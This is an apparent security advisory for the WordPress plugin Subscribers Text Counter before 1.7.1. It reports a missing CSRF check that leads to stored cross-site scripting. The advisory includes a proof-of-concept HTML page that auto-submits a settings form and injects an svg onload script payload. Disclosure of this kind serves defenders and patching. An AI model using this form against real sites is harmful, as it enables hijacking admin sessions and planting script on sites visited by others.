## WordPress Plugin Vulnerabilities

# Subscribers Text Counter < 1.7.1 - Settings Update via CSRF to Stored XSS

### Description

The plugin does not have CSRF check in place when updating its settings, which could allow attackers to make a logged in admin change them via a CSRF attack, which also lead to Stored Cross-Site Scripting due to the lack of sanitisation and escaping

### Proof of Concept

Create an HTML file with the following content and have a logged in admin access it:
```
<body onload="document.forms[0].submit()">
<form action="https://example.com/wp-admin/options-general.php?page=subscribers\_text\_counter" method="POST">
<input type="text" name="twitter" value='"><svg/onload=alert(2);>'>
<input type="text" name="stextcount\_hidden" value="settings">
<input type="submit" value="submit">
</form>
</body>
```
Navigate to the plugin's settings to trigger the XSS.
